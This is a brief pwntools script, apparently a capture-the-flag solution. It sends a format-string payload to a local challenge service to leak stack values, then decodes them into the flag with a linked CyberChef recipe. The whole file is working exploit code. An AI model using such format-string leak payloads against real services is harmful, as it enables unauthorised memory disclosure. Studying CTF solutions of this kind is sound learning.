from pwn import *

p = remote("127.0.0.1", 1337)
p.recv()
p.sendline("%14$p %15$p %16$p %17$p %18$p")
p.interactive()

# After you leak the addresses, you go to cyber chef
# https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',8,true)From_Hex('Auto')&input=MHgzMDQ2N2IzNjM1MzI0MzQ0IDB4NTUzMDU5NWY1NDQwNGQ1MiAweDQ3NGU0OTUyNTQ1MzVmNTIgMHg1NTUzNWY1NDMzNDc1ZjVhIDB4N2Q1MzQ3MzQ0YzQ2NWY0ZA
# Which gives you the flag.